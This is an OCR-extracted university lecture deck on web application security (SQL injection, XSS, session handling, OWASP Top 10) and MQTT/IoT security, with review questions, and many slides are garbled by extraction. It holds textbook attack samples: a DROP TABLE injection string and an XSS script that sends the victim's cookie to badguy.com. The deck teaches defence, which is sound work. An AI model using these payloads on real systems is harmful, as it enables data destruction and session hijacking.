12/1/21 







<!-- Start of picture text -->
Introduction to Computer and Network Security<br>Silvio Ranise  [ silvio.ranise@unitn.itsilvio.ranise@unitn.it or  ranise@fbk.eu ]<br><!-- End of picture text -->

Introduction to Computer and Network Security _Silvio Ranise_ [ silvio.ranise@unitn.itsilvio.ranise@unitn.it or _<u>ranise@fbk.eu</u>_ ] 





- § Digression on web applications 

- § Securing web applications 

- § Injection attacks 

   - § SQL injection 

   - § Cross Site Scripting 

- § Some more attacks on web applications 

- § Importance of access control for web applications 

- § Digression on IoT applications 

- § MQTT 

- § Some security issues of MQTT 





<!-- Start of picture text -->
1<br><!-- End of picture text -->

> S. Ranise - Security & Trust (FBK) **1** 

1 

12/1/21 

#### **2** 



S. Ranise - Security & Trust (FBK) 



<!-- Start of picture text -->
Server = abstractionabstraction<br><!-- End of picture text -->

Server = abstractionabstraction of computer resources 

      - – 

      - Clients and servers exchange messages in a request <u>response</u> messaging pattern: 

         - client sends a request 

      - server returns a response 

      - • To communicate, client and server must 

         - have common language 

         - follow rules 

      - i.e. they must satisfy a communications protocol 

      - • All client-server protocols operate in the <u>application layer</u> 

- Clients 

   - Not concerned with how the server performs while fulfilling the request and delivering the response 

   - Only need to understand the response based on the well-known application protocol, i.e. the content and the formatting of the data for the requested service. 

S. Ranise - Security & Trust (FBK) 

**3** 

2 





<!-- Start of picture text -->
CLIENT/SERVER OVER HTTP<br>mrt<br>HTTP REQUEST<br>+ + + ZL<br>\<br>Po ©<br><!-- End of picture text -->



<!-- Start of picture text -->
mrt<br><!-- End of picture text -->



12/1/21 





<!-- Start of picture text -->
HTTP version Status code Reason phrase Headers<br>HTTP/1.0 200 OK<br>Date: Sun, 21 Apr 1996 02:20:42 GMT<br>Server: Microsoft-Internet-Information-Server/5.0<br>Connection: keep-alive<br>Content-Type: text/html Data<br>Last-Modified: Thu, 18 Apr 1996 17:39:05 GMT<br>Set-Cookie: …<br>Content-Length: 2543<br><HTML> Some data... whatever ...</HTML><br>Cookies<br>S. Ranise - Security & Trust (FBK) 6<br><!-- End of picture text -->



<!-- Start of picture text -->
6<br><!-- End of picture text -->



- **HTTP cookie** (also called **web cookie** , **Internet cookie** , **browser cookie** , or simply **cookie** ) • Small piece of data sent from a website and stored on the user's computer by the user's <u>web browser</u> while the user is browsing 

   - Designed to be a reliable mechanism for websites to remember stateful information (such as items added in the shopping cart in an online store) or to record the user's browsing activity (including clicking particular buttons, <u>logging in, or recording which pages were visited in the past)</u> 

- **Authentication cookies** are the most common method used by web servers to know whether the user is logged in or not, and which account they are logged in with 

- Without such a mechanism, the site would not know whether to send a page containing sensitive information, or require the user to authenticate themselves by logging in 

- The security of an authentication cookie generally depends on the security of the issuing website and the user's <u>web browser, and on whether the cookie data is encrypted</u> 

- • **Security vulnerabilities** may allow a cookie's data to be read by a hacker, used to gain access to user data, or used to gain access (with the user's credentials) to the website to which the cookie belongs (see <u>cross-site scripting</u> and <u>cross-site request forgery for examples)</u> 

- **Privacy concerns** : tracking cookies, and especially third-party tracking cookies, are commonly used as ways to compile long-term records of individuals' browsing histories 

   - European law requires that all websites targeting EU member states gain " _informed consent_ " from users before storing non-essential cookies on their deviceS. Ranise - Security & Trust (FBK) **7** 



<!-- Start of picture text -->
7<br><!-- End of picture text -->

4 



<!-- Start of picture text -->
COOKIE<br><!-- End of picture text -->

COOKIE AUTHENTICATION COOKIE AUTHENTICATION <mark>ee</mark> 







12/1/21 



<!-- Start of picture text -->
10<br><!-- End of picture text -->



S. Ranise - Security & Trust (FBK) 



- § Creating a Web application is easy, but **creating a secure Web application is hard and tedious** 

- § Because of the multi-tiered architecture, **security flaws may appear at many levels** 

- § Need to secure 

   - § Database 

   - § Server 

   - § Application 

   - § Network 

##### **To create a secure Web application, ones needs to examine every layer** 

S. Ranise - Security & Trust (FBK) 

**11** 

6 



<!-- Start of picture text -->
SECURING<br><!-- End of picture text -->

## SECURING WEB APPLICATIONS (2) 















<!-- Start of picture text -->
SECURING<br><!-- End of picture text -->



<!-- Start of picture text -->
SECURING WEB APPLICATIONS (3)<br>Al pln,<br><!-- End of picture text -->



<!-- Start of picture text -->
Al pln,<br><!-- End of picture text -->









<!-- Start of picture text -->
@<br><!-- End of picture text -->

12/1/21 





<!-- Start of picture text -->
§ Application-Layer § Network-Layer:<br><!-- End of picture text -->



<!-- Start of picture text -->
§ SQL Injection  § Packet-Sniffing<br><!-- End of picture text -->



<!-- Start of picture text -->
§ Cross-Site-Scripting (XSS)  § Man-In-The-Middle Attacks (MITM)<br>§ Cross-Site Request Forgery (CSRF) § DNS Attack<br>§ Broken Authentication<br>§ Unvalidated Input<br><!-- End of picture text -->

- § **User-Layer:** § Phishing 



<!-- Start of picture text -->
§ Server-Layer<br><!-- End of picture text -->

- § Denial-of-Service (DoS) § OS Exploitation 



<!-- Start of picture text -->
S. Ranise - Security & Trust (FBK)<br><!-- End of picture text -->

- § Key-logging § Malware 



<!-- Start of picture text -->
14<br><!-- End of picture text -->



##### § Authentication 

   - § You want to know who you are communicating with 

- § Authorization (Access Control) 

   - § User must have access to only those resources that they are entitled to 

##### § Confidentiality 

- § You want to keep information secret (e.g., credit card number) 

##### § Integrity 

- § You want to know that a message has not been modified in transit 

##### § Non-repudiation 



<!-- Start of picture text -->
§ If someone has sent a message, it should be impossible to deny it later (legal implications)<br><!-- End of picture text -->



<!-- Start of picture text -->
S. Ranise - Security & Trust (FBK)<br><!-- End of picture text -->



<!-- Start of picture text -->
15<br><!-- End of picture text -->

8 

12/1/21 





- § **Web application security** is a branch of **information security** that deals specifically with **security of websites, web applications and web services** 

   - § At a high level, web application security draws on the principles of **application security** but applies them specifically to Internet and web systems 

- § **Application security** encompasses measures taken to improve the security of an application often by **finding, fixing and preventing security vulnerabilities** 

S. Ranise - Security & Trust (FBK) 







<!-- Start of picture text -->
16<br><!-- End of picture text -->

##### § Safely browse the web 

   - § Visit a variety of web sites without incurring harm 

- § Support secure **web apps** 

   - § Apps provided over the web can have same security properties as stand-alone applications 

##### § Support secure **mobile apps** 

- § Web protocols and content standards are used as back end of many mobile apps 

S. Ranise - Security & Trust (FBK) 

**17** 

9 





<!-- Start of picture text -->
@<br><!-- End of picture text -->

# @ INJECTION ATTACKS 





<!-- Start of picture text -->
<form action="dispatcherfYoperation=lodin" method="post"><br><input name="usernameY type="text"><br><input name="passwoyi" type="password"<br><input type="submj£" value="“Submit"><br></form><br>String username = request.getParameter("usd@rname");<br>String password = request.getParameter ("pasword");<br>Statement stmt =<br>con.createStatement("select * from TBL_USER\"<br>+"where username ='"+ username +<br>+"' and password = '"+ password+"'");<br>ee eee —<br><!-- End of picture text -->



<!-- Start of picture text -->
con.createStatement("select * from TBL_USER\"<br>+"where username ='"+ username<br>+"' and password = '"+<br>ee eee —<br>A1:2017- Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent<br>interpreter into executing unintended commands or accessing data without proper authorization.<br>Injection to an interpreter as part of acommand or query. The attacker's hostile datacantrickthe<br>,<br><!-- End of picture text -->



<!-- Start of picture text -->
( )<br><!-- End of picture text -->



<!-- Start of picture text -->
SQL INJECTION (2)<br><!-- End of picture text -->









<!-- Start of picture text -->
@<br><!-- End of picture text -->



<!-- Start of picture text -->
SOL<br><!-- End of picture text -->



<!-- Start of picture text -->
SOL INJECTION (3)<br>a —<br>\_<br><!-- End of picture text -->

12/1/21 



- § Goal: deletion of stored _data by tricking the SQL interpreter with a carefully crafted query_ 

- § Consider the following chunk of code to be executed by $recipient = $_POST[‘recipient’]; server to query the db $sql = " **SELECT * FROM Person** 

- § The idea is to craft a particular string ‘recipient’ to change **WHERE Username='$recipient'** "; the meaning of the query from $rs = $db->executeQuery($sql); § Extracting info about a person with a given username to 

   - § Something malicious such as 

      - § **; DROP TABLE Person --** 

   - § What happens? 

      - § The following query will be passed to the SQL interpreter § SELECT * FROM Person WHERE **UserId = ‘ ‘; DROP TABLE Person --** ; 

      - § Which leads to… 

**UserId = ‘ ‘; DROP TABLE Person --** ; Similarly, attackers can add users, § Which leads to… reset passwords, … S. Ranise - Security & Trust (FBK) **22** 



<!-- Start of picture text -->
22<br><!-- End of picture text -->



<!-- Start of picture text -->
§ CardSystems (june 2005)<br>§ credit card payment processing company<br>§ SQL injection attack put company out of business<br>§ The Attack<br>§ 263,000 credit cards stolen from database<br>§ credit cards stored unencrypted Cardsystem was compliant with a<br>§ 43 million  credit cards exposed security standard called PCI-DSS<br>S. Ranise - Security & Trust (FBK) 23<br><!-- End of picture text -->

12 



<!-- Start of picture text -->
SOL INJECTION: SUMMARY<br><!-- End of picture text -->



<!-- Start of picture text -->
@<br><!-- End of picture text -->





<!-- Start of picture text -->
SOL INJECTION: MITIGAT IONS<br>YOURsors sci0L.| BREAKeoreTNG? | NevSov || YEARS stones<br>WERECOMPUTER HAVING TROUBLE. SOME | iy 9. WAY‘) poneRobert’); Studerts;-~DROP 2 tI HOPE YOURE HAPPY.<br>Ti iT WE CALL HIM. DATABASE INPUTS.<br>@<br><!-- End of picture text -->











<!-- Start of picture text -->
<FORM ACTION="hello" ><br><B>Your name: </B><br><INPUT NAME="name" TYPRA"text"| SIZE="10"><br><INPUT TYPE="sSubmit" MALUE="Nopw c]ick”><br></FORM><br>protected void doGet(HttpServletRequest request,<br>HttpServletResppnse response){<br>String name = request.getParameter ("name");<br>response.setContentType("texf/html");<br>out.println("<H1> "Hello"+ name + "!</H1>"); ..<br>}<br><!-- End of picture text -->



<!-- Start of picture text -->
(<br><!-- End of picture text -->



<!-- Start of picture text -->
out.println("<H1> "Hello"+ name + "!</H1>"); ..<br>}<br>A7:2017- XSS flaws occur whenever an application includes untrusted data in a new web page without<br>Cross-Site proper validation or escaping, or updates an existing web page with user-supplied data using a<br>oe browser API that can create JavaScript. XSS allows attackers to execute scripts in the victim’s<br>Scripting (XSS) | browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.<br><!-- End of picture text -->





<!-- Start of picture text -->
http://www. vulnerable.com/welcome.php?name= vulnerable.com/welcome.php?name=<br><script>window.open ("http://www.badguy.com/<br>collect.php?cookie= "+document.cookie) </script><br><!-- End of picture text -->



<!-- Start of picture text -->
http://www. vulnerable.com/welcome.php?name= vulnerable.com/welcome.php?name=<br><script>window.open ("http://www.badguy.com/<br>collect.php?cookie= "+document.cookie) </script><br><html><br><body><br><script>window.open( "http://www. badguy.com/<br>collect.php?cookie=" +document.cookie)</<br>script>, welcome to our site.<br></body><br></html><br>— _ @<br><!-- End of picture text -->







12/1/21 



- § An attacker attaches a script with an HTTP response 

- § The script executes with privileges available to the responding web application and the attacker is able to access privileged information only available to the user or the web application 

- § Since cookies often contain authentication information, this could allow the attacker to impersonate the victim 

- § At least two variants exist 

   - § **Reflected** XSS: using a constructed URL (as in previous slides) 

   - § **Stored** XSS: Using POST to store the bad URL inside a comment/forum 

S. Ranise - Security & Trust (FBK) 



<!-- Start of picture text -->
30<br><!-- End of picture text -->



- § Filter all input parameters from HTTP GET and POST (even when using client-side validation) … 

   - § Characters with special meaning in HTML and JavaScript, e.g., , (, ), #, & should be removed or substituted (e.g., < becomes &lt;) … 

   - § This may also require filtering all types of active content; e.g., JavaScript 

- § But notice that it is easy to forget something, so it’s better to specify what characters are allowed, e.g., [A-Za-z0-9] 

   - § Better using positive than negative filtering 

S. Ranise - Security & Trust (FBK) 

**31** 

16 

12/1/21 



<!-- Start of picture text -->
32<br><!-- End of picture text -->





<!-- Start of picture text -->
S. Ranise - Security & Trust (FBK)<br><!-- End of picture text -->



The price field is used to ensure that the price of the currently chosen book is passed with the order 

- § Consider the following HTML form which is about to submit a book purchase order 



- § The client can download the page, change the form, and edit the value of the price input (and modifying the action attribute of the form element) 

- § Despite this seems a bad way to build a web app, there are apps that use this approach… 

S. Ranise - Security & Trust (FBK) 

**33** 

17 

12/1/21 





<!-- Start of picture text -->
§ Problem<br><!-- End of picture text -->

- § **Problem** : Clients can easily circumvent checks in the HTML code itself, such as hidden parameters (e.g., price) and JavaScript code 

   - § Download the page to your computer, edit the HTML and/or JavaScript, load up the modified page in your browser, fill in illegal parameters, and click ”Submit” 

   - § Client-side validation is useful for performance reasons, but useless from a security point of view 

- § **Solution:** never trust any input from the user, and never trust client side input validation 

   - § All parameters must be validated on the server side before they are used 

   - § Positive filtering is better than negative filtering 

   - § Good design would involve a library of functions that provide the necessary checks 

S. Ranise - Security & Trust (FBK) 



<!-- Start of picture text -->
34<br><!-- End of picture text -->



- § Username and password combinations are commonly used and commonly broken 

- § Collections of username and passwords are on sale in the dark web 

##### § **Causes** 

- § Insecure storage of password hash (SQL injection) 

- § Weak hashing algorithms employed (e.g., LinkedIn used SHA-1) 

- § Faulty session management (session identifiers exposed) 

- § Long sessions or too many attempts at password recovery 

S. Ranise - Security & Trust (FBK) 

**35** 

18 

12/1/21 



- § Disallow weak passwords 

- § Use a stronger hash algorithm 

- § Salt the passwords 

- § Use HTTPS for encrypting session identifiers to prevent MITM 

- § Do not expose credentials in untrusted locations (hidden fields, cookies, urls) 

- § Implement account lockouts 

- § Implement Multi Factor Authentication 



<!-- Start of picture text -->
Recall the discussion about secure<br>storage of passwords and authentication<br>procedures in the slide deck<br>S. Ranise - Security & Trust (FBK) Authentication I 36<br><!-- End of picture text -->



<!-- Start of picture text -->
36<br><!-- End of picture text -->



- § Poor management of session identifiers can lead to different attacks such as 

   - § Cross-Site Request Forgery (CSRF) 

   - § Session spoofing and hijacking 

   - § Broken Authentication 

   - § Privilege Escalation 

   - § Sensitive Data Leakage 

- § A session identifier must be considered as an important asset to secure with strategies such as 

   - § Implementing Strict Timeouts 

   - § Session-ID must be renewed when an authentication state is passed (on logging in/out) 

   - § Ensuring session IDs cannot be easily guessed (use a large space and generate ids with a good random number generator) 

   - § … 

S. Ranise - Security & Trust (FBK) 

**37** 

19 

12/1/21 



- § **Proper Cookie Management** : Session identifiers are stored on the client (browser) side in cookies 

- § Therefore, cookies should be managed properly ensure security of sessions: 

   - § Use "Domain" and "Path" attributes to restrict the scope of cookies to narrow subdomains 

   - § Use "Secure" attribute to force browsers to send cookies over HTTPS 

   - § Use "HttpOnly" attribute to prevent scripts from accessing the cookies 

   - § Use "X-XSS-Protection" header to allow browsers to detect XSS attacks 

   - § Use "Content-Security-Policy" headers to instruct browsers to only load resources from whitelisted locations 

S. Ranise - Security & Trust (FBK) 



<!-- Start of picture text -->
39<br><!-- End of picture text -->





<!-- Start of picture text -->
38<br><!-- End of picture text -->

S. Ranise - Security & Trust (FBK) 

20 

WHY ACCESS CONTROL IS IMPORTANT FOR WEB APPLICATIONS 



<!-- Start of picture text -->
WEB<br><!-- End of picture text -->





<!-- Start of picture text -->
EQUIFAX<br><!-- End of picture text -->



<!-- Start of picture text -->
APACHE<br><!-- End of picture text -->





EQUIFAX BREACH: APACHE STRUTS VULN 



<!-- Start of picture text -->
@<br><!-- End of picture text -->

12/1/21 





- § "Security best practices dictate that this **user have as little privilege as possible on the server itself** , since _security vulnerabilities in web applications and web servers are so commonly exploited_ ." 

Alex McGeorge, Head of threat intelligence at the security firm Immunity 

- § In other words, follow the **Principle of Least Priviledge:** 

   - § every **subject** (such as a process, a user, or a program) must be able to **access only the information and resources that are necessary for its legitimate purpose** 

- § Even if commands are injected, if these are run with the lowest possible priviledges, then less harm can be performed _!_ 

- § This seems to be an effective **mitigation measure** to **reduce the impact of unknown vulnerabilities** 

This approach to security is also known under the name of **risk based** and can be summarized as follows: _a security breach is not a matter of_ **_if_** _but_ **_when_** 



<!-- Start of picture text -->
42<br><!-- End of picture text -->



<!-- Start of picture text -->
43<br><!-- End of picture text -->



S. Ranise - Security & Trust (FBK) 

22 









<!-- Start of picture text -->
T OWASP Top 10 LE<br>10 Application Security Risks - 2017<br>A1:2017- Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent<br>Iniecti to an interpreter as part of a command or query. The attacker's hostile data can trick the<br>njection interpreter into executing unintended commands or accessing data without proper authorization.<br>ia—<br>A2:2017-Broken Application functions related to authentication and session management are often implemented<br>Authenticationth * . otherincorrectly,implementation allowing attackers flaws to assume to compromise other users’ passwords,identitieskeys, (temporarilyor sessionor tokens,permanently). or to exploit<br>A3:2017- Many web applications and APIs do not properly protect sensitive data, such as financial, ;<br>Sensitive Data healthcare, and Pll. Attackers may steal or modify such weakly protected data to conduct credit<br>Exposure | cardencryption fraud, identityat rest or theft,in transit, or other crimes. as well as Sensitivespecial precautions data deserves when extra exchang prot e ction,d withsuchthe browser. as<br>A4:2017-XML Many older or poorly configured XML processors evaluate external entity references within XML<br>External documents. External entities can be used to disclose internal files using the file URI handler,<br>— internal file shares, internal port scanning, remote code execution, and denial of service attacks,<br>Entities (XXE) | such as the Billion Laughs attack.<br>A5:2017-Broken Restrictions on what authenticated users are allowed to do are often not properly enforced.<br>Access ControlContro! Attackersother users’ can accounts, exploit these view flaws sensitive to access files, modifyunauthorized other users’ data, functionality change and/or access data, such rights, as etc. access<br><!-- End of picture text -->



<!-- Start of picture text -->
€<br><!-- End of picture text -->



<!-- Start of picture text -->
{ Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure<br>A6:2017-Security default configurations, in-complete or ad hoc configurations, open cloud storage, misconfigured<br>Mi fi ti HTTP headers, and verbose error messages containing sensitive information. Not only must all<br>iscontiguration operating systems, frameworks, libraries, and applications be securely configured, but they must<br>\ ! also be patched/upgraded in a timely fashion.<br>A7:2017- XSS flaws occur whenever an application includes untrusted data in a new web page without<br>Cross-Site proper validation or escaping, or updates an existing web page with user-supplied data using a<br>_. browser API that can create JavaScript. XSS allows attackers to execute scripts in the victim’s<br>Scripting (XSS) browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.<br>YQ<br>A8:2017- Insecure deserialization often leads to remote code execution. Even if deserialization flaws do not<br>Insecure result in remote code execution, they can be used to perform attacks, including replay attacks,<br>Deserialization injection attacks, and privilege escalation attacks.<br>YO<br>A9:2017-Using Components, such as libraries, frameworks, and other software modules, run with the same<br>Components privileges as the application. If a vulnerable component is exploited, such an attack can facilitate<br>with Known serious data loss or server takeover. Applications and APIs using components with known<br>Vulnerabilities vulnerabilities may undermine application defenses and enable various attacks and impacts.<br>eee<br>A10:2017 Insufficient logging and monitoring, coupled with missing or ineffective integration with incident<br>Insufficient response, allows attackers to further attack systems, maintain persistence, pivot to more systems,<br>Logging & and tamper, extract, or destroy data. Most breach studies show time to detect a breach is over<br>| Monitoring | 200 days, typically detected by external parties rather than internal processes or monitoring. »<br>—_ SS<br><!-- End of picture text -->







12/1/21 





- § One of the most used architecture for distributed applications and in particular for web applications 

- § Communications take place following the _request/reply_ (pull) interaction model 



<!-- Start of picture text -->
Request<br>Client Server<br>Response<br>§ Drawbacks:<br>§ interaction is limited to two entities (one-to-one)<br><!-- End of picture text -->

- § each entity must know how to address its partner in the communication 

- § the two entities must be available at the same time in order to communicate 

- § communication is inherently synchronous 

- § communication is only pull-based 



<!-- Start of picture text -->
48<br><!-- End of picture text -->



<!-- Start of picture text -->
S. Ranise - Security & Trust (FBK) 48<br><!-- End of picture text -->



- § Publish/subscribe is a comprehensive solution for client-server problems 

- § **Many-to-many communication model** - Interactions take place in an environment where various information producers and consumers can communicate, all at the same time. Each piece of information can be delivered at the same time to various consumers. Each consumer receives information from various producers 

- § **Space decoupling** - Interacting parties do not need to know each other. Message addressing is based on their content 

- § **Time decoupling** - Interacting parties do not need to be actively participating in the interaction at the same time. Information delivery is mediated through a third party 

- § **Synchronization decoupling** - Information flow from producers to consumers is also mediated, thus synchronization among interacting parties is not needed 

- § **Push/Pull interactions** - both methods are allowed 

S. Ranise - Security & Trust (FBK) 

**49** 

25 

12/1/21 



- § Publishers: produce data in the form of events 

- § Subscribers: declare interests on published data with subscriptions 

- § Each subscription is a filter on the set of published events. 

- § An Event Notification Service (ENS) notifies to each subscriber every published event that matches at least one of its subscriptions 



<!-- Start of picture text -->
subscribe<br>Event<br>Publishers publish notification  Subscribers<br>system<br>(info producers) (broker/  (info consumers)<br>mediator)<br>notify<br>S. Ranise - Security & Trust (FBK) 50<br><!-- End of picture text -->



<!-- Start of picture text -->
50<br><!-- End of picture text -->



- § Events represent information structured following an _event schema_ 

- § The event schema is fixed, defined a-priori, and known to all the participants 

- § It defines a set of fields or attributes, each constituted by a name and a type 

   - § The types allowed depend on the specific implementation, but basic types (like integers, floats, booleans, strings) are usually available 

- § Given an event schema, an event is a collection of values, one for each attribute defined in the schema 

S. Ranise - Security & Trust (FBK) 

**51** 

26 

12/1/21 



- § Subscribers express their interests in specific events issuing subscriptions 

- § A subscription is a _constraint_ expressed on the event schema 

- § The Event Notification Service will notify an event _e_ to a subscriber _x_ only if the values that define the event satisfy the constraint defined by one of the subscriptions _s_ issued by x 

   - § In this case we say that **_e_ matches** **_s_** . 

- § Subscriptions can take various forms, depending on the subscription language and model employed by each specific implementation: 

   - § Topic-based 

   - § Hierarchy-based 

   - § Content-based 

   - § Type-based 

   - § … 

S. Ranise - Security & Trust (FBK) 



<!-- Start of picture text -->
52<br><!-- End of picture text -->



- § Data published in the system is mostly unstructured, but each event is “tagged” with the identifier of a _topic_ it is published in 

- § Subscribers issue subscriptions containing the topics they are interested in 

- § A topic can be thus represented as a “virtual channel” connecting producers to consumers 

   - § Data distribution in topic-based publish/subscribe systems is close to group communication 



<!-- Start of picture text -->
Event<br>Publishers publish notification  Subscribers<br>system<br>(info producers) (info consumers)<br>Topic<br>notify<br><!-- End of picture text -->



<!-- Start of picture text -->
S. Ranise - Security & Trust (FBK)<br><!-- End of picture text -->



<!-- Start of picture text -->
53<br><!-- End of picture text -->

27 

12/1/21 





- § As in topic-based subscription, event is “tagged” with the _topic_ it is published in, and subscribers issue subscriptions containing the topics they are interested in. 

- § Contrary to topic-based subscription, topics are organized in a hierarchical structure which express a notion of containment between topics. When a subscriber subscribe a topic, it will receive all the events published in that topic and in all the topics present in the corresponding sub-tree 



<!-- Start of picture text -->
Event<br>Publishers publish notification  Subscribers<br>system<br>(info producers) (info consumers)<br>Topic<br>notify<br>S. Ranise - Security & Trust (FBK) 54<br><!-- End of picture text -->



<!-- Start of picture text -->
54<br><!-- End of picture text -->



- § Usually implemented as a: 

   - § **Centralized service** : the ENS is implemented on a single server 

   - § **Distributed service** : the ENS is constituted by a set of nodes, event brokers, which cooperate to implement the service 

- § The latter is usually preferred for large settings where scalability is a fundamental issue 

S. Ranise - Security & Trust (FBK) 

**55** 

28 

12/1/21 



<!-- Start of picture text -->
56<br><!-- End of picture text -->



S. Ranise - Security & Trust (FBK) 



<!-- Start of picture text -->
57<br><!-- End of picture text -->





<!-- Start of picture text -->
S. Ranise - Security & Trust (FBK)<br><!-- End of picture text -->

29 



<!-- Start of picture text -->
|<br>MOTT<br>@<br>MOTT: PUBLISH-SUBSCRIBE PATTERN<br><!-- End of picture text -->



<!-- Start of picture text -->
MOTT<br><!-- End of picture text -->



<!-- Start of picture text -->
MOTT:<br><!-- End of picture text -->







12/1/21 







<!-- Start of picture text -->
S. Ranise - Security & Trust (FBK) 60<br><!-- End of picture text -->



- § From <u>http://mqtt.org/</u> 

- § It is possible to pass a user name and password with an MQTT packet 

- § Encryption across the network can be handled with TLS, independently of the MQTT protocol itself ( **it is worth noting that TLS is not the lightest of protocols, and does add significant network overhead** ) 

- § Additional security can be added by an application encrypting data that it sends and receives, but this is **not something built-in to the protocol, in order to keep it simple and lightweight** 

S. Ranise - Security & Trust (FBK) 

**61** 

31 





<!-- Start of picture text -->
oO Return Code Response<br>La |[rot Connectio0x00 Conprotocol n ectionRefused,version Accepted unacceptable] The Serverprotocol doesCo n requestednection acceptedot support theby the levelClient of the MQTT<br>0x02 Connection Refused, identifier | The Client identifier is correct UTF-8 but not allowed<br>tejected by the Server<br>0x03 Connection Refused, Server The Network Connection has been made but the<br>0x04 Connectionunavailablea Refused, bad user The data in theMQTT user service name oris unavailable password is malformed<br>0x05 name or password<br> Connection Refused, not The Client i t authorized t t<br>authorized @ Clrent is not authorized’ to connec!<br>6255[ Reserved for future use<br><!-- End of picture text -->



<!-- Start of picture text -->
» Internet Protocol Version 4, Src: 192.168.0.5, Dst: 192.168.0.10<br>y» TransmissionMQvy ConnectTelemetryCommandTransportControl ProtPr tocol o col, Src Port: 55972, Dst Port: 1883, Seq:<br>» @@@1 @000 = Header Flags: @x1@ (Connect Command)<br>Msg Len: 33<br>Protocol Name: MQTT<br>> pentaKeep Alive:= ¢60Connec-_ ags: oxe?xc<br>Client ID: Pasknel<br>User Namen teste<br>— CREDENTIALSIN CLEAR TEXT<br>wy<br><!-- End of picture text -->



<!-- Start of picture text -->
TOTAL RESULTS<br>j 79,236<br>~ eg L - :<br>Pd *<br>China 21,700<br>UnitedGermanyKorea, RepublicStates 13,7075.245<br>Japon of 26793384<br>(1) oo som<br>sess “0<br>ostMongoDB “36<br>001 6<br>TOP ORGANIZATIONS<br>‘Amazon.comHangzhou Alibaba Advertising Co.,Ltd arazz<br>(5,530) DigitalGoogle CioudOcean az474<br>TOP OPERATING SYSTEMS<br>linux 1<br>TOP PRODUCTS<br>wart 51418<br>MosquittoMongodB 2rsrtFs<br>nginx 10<br>Erlang Port Mapper Daemon 7<br><!-- End of picture text -->





<!-- Start of picture text -->
@ RC=0 - Connection. accepted (24,361)<br>m™ RC=1- Unacceptable protocol version (1)<br>m@ RC =2 - Identifierses rejected. (98)<br>; 60,3% m RC = 3 - Server unavailable (206)<br>RC = 4 - Bad username or password (5,530)<br>0,5% m RC=5 - Not authorised (10,150)<br>0,2% 0,1%<br><!-- End of picture text -->



<!-- Start of picture text -->
MOTT:<br><!-- End of picture text -->

MOTT: MORE SECURITY ISSUES 



<!-- Start of picture text -->
@<br><!-- End of picture text -->



<!-- Start of picture text -->
IOT<br><!-- End of picture text -->



### IOT SECURITY: TAKEAWAYS 



<!-- Start of picture text -->
stands for “security”<br><!-- End of picture text -->



<!-- Start of picture text -->
@<br><!-- End of picture text -->

12/1/21 



- § What is web application security? 

- § For which kind of security threats found in web applications, TLS is not an adequate countermeasures? 

- § Which kind of attackers threaten web applications? 

- § What is an injection attacks?  Give at least two examples of such an attack. 

- § What is a CSRF attack? Give a high level description of how to mount it. 

- § What is a XSS attack? Give a high level description of how to mount it. 

- § What is a Phishing attack? Give a high level description of how to mount it. 

- § What are the main mitigation measures for injection attacks? And for CSRF attacks? And For XSS attacks? And for Phishing attacks? 

S. Ranise - Security & Trust (FBK) 



<!-- Start of picture text -->
66<br><!-- End of picture text -->



- § Explain the publish-subscribe pattern and how it differs from the client-server pattern.  What are the advantages of using the publish-subscribe pattern for IoT applications? 

- § Explain how MQTT implements the publish-subscribe pattern 

- § What are the main security issues of MQTT? 

- § Why it may be problematic to use TLS to secure the communication between the MQTT broker and the IoT devices? 

S. Ranise - Security & Trust (FBK) 

**67** 

34 

